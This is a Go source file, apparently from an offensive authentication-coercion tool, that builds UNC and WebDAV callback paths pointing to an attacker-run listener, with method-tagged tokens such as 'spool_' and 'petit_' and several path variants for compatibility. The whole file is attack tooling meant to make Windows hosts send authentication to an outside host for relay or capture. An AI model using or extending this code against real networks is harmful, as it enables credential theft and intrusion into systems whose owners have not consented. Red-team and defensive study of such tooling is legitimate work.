package coerce

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

// GenerateToken creates a random 8-character hex token for callback correlation
func GenerateToken() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// BuildCallbackPathWithToken builds a callback path with method-prefixed token for correlation
// If token is empty, generates a new one with the method prefix
// Returns (path, token) where token is like "spool_abc123" or "petit_def456"
func BuildCallbackPathWithToken(listener string, useHTTP bool, httpPort int, methodPrefix string, existingToken string) (string, string) {
	token := existingToken
	if token == "" {
		token = fmt.Sprintf("%s_%s", methodPrefix, GenerateToken())
	}

	if useHTTP {
		// HTTP/WebDAV format: \\listener@80/TOKEN\file
		// CRITICAL: Use FORWARD SLASH after @port, then BACKSLASHES for rest
		if httpPort == 0 {
			httpPort = 80
		}
		path := fmt.Sprintf("\\\\%s@%d/%s\\file.txt", listener, httpPort, token)
		return path, token
	}
	// UNC format: \\listener\TOKEN\file
	path := fmt.Sprintf("\\\\%s\\%s\\file.txt", listener, token)
	return path, token
}

// buildCallbackPath builds a callback path for coercion (legacy, no token)
func buildCallbackPath(listener string, useHTTP bool, httpPort int) string {
	if useHTTP {
		// HTTP/WebDAV format: \\listener@80/path\file
		// CRITICAL: Use FORWARD SLASH after @port, then BACKSLASHES for rest
		// This matches goercer's proven working format
		if httpPort == 0 {
			httpPort = 80
		}
		return fmt.Sprintf("\\\\%s@%d/test\\test\\Settings.ini", listener, httpPort)
	}
	// UNC format: \\listener\share\file
	return fmt.Sprintf("\\\\%s\\share\\file.txt", listener)
}

// buildCallbackPaths builds multiple path variations for maximum compatibility
func buildCallbackPaths(listener string, useHTTP bool, httpPort int) []string {
	if useHTTP {
		if httpPort == 0 {
			httpPort = 80
		}
		// Match goercer format: \\IP@80/path\nested\file (FORWARD SLASH after @port!)
		return []string{
			fmt.Sprintf("\\\\%s@%d/test\\test\\Settings.ini", listener, httpPort),
			fmt.Sprintf("\\\\%s@%d/test\\file.txt", listener, httpPort),
			fmt.Sprintf("\\\\%s@%d/DavWWWRoot\\test.txt", listener, httpPort),
		}
	}

	// UNC path variations
	return []string{
		// Standard variations
		fmt.Sprintf("\\\\%s\\share\\file.txt", listener),
		fmt.Sprintf("\\\\%s\\C$\\file.txt", listener),
		// With subfolders
		fmt.Sprintf("\\\\%s\\share\\sub\\file.txt", listener),
	}
}
